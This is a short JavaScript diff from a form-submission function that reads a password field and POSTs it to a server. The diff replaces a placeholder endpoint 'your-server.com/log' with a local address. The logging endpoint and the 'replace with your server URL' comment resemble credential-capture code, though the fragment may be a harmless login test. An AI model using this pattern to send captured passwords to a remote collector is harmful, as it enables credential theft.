@@ -3,7 +3,7 @@ function submitForm() {
     const password = document.getElementById('password').value;
     
     // Send data to a server (replace with your server URL)
-    fetch('https://your-server.com/log', {
+    fetch('http://127.0.0.1:4040', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
